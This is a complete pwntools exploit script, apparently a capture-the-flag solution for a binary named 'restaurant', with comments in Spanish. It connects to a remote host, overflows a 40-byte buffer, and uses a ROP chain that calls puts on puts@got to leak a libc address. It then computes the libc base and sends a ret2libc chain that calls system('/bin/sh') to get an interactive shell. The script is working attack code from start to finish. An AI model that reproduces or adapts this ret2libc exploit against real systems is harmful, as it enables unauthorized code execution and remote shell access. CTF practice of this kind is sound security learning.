from pwn import *
import pdb

gs = '''
init-pwndbg
b *0x0000000000400ecd
c
'''

context(terminal=['tmux', 'split-window', '-h'])

elf = ELF('./restaurant')
libc = ELF('./libc.so.6')

r = remote('94.237.60.251', 41356)
#r = process('./restaurant')
#r = gdb.debug('./restaurant', gdbscript=gs, aslr=False)

payload = b'A' * 40

# leak de libc

pop_rdi = 0x00000000004010a3
main_plt = elf.symbols['main'] # offset de main
puts_plt = elf.plt['puts'] # offset de puts
puts_got = elf.got['puts']

payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_plt) 

r.sendline(b'1')
r.sendline(payload)

junk = r.recvuntil(b"\xa3\x10@")

received = r.recv(6) # la dirección leakeada tenía un salto de línea, por eso lo hacemos así

leak = u64(received.ljust(8, b'\x00'))
log.info("Leaked libc address puts@got: " + hex(leak))

libc.address = leak - 0x80aa0
log.info("Libc base address %s " % hex(libc.address))

# ejecución de system

payload = b'A' * 40

bin_sh = 0x1b3e1a
system = 0x4f550
exit_addr = libc.sym["exit"]

bin_sh_addr = libc.address + bin_sh
system_addr = libc.address + system

ret_gadget = 0x000000000040063e

payload += p64(ret_gadget) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr) + p64(exit_addr)

r.sendline(b'1')
r.sendline(payload)

r.interactive()
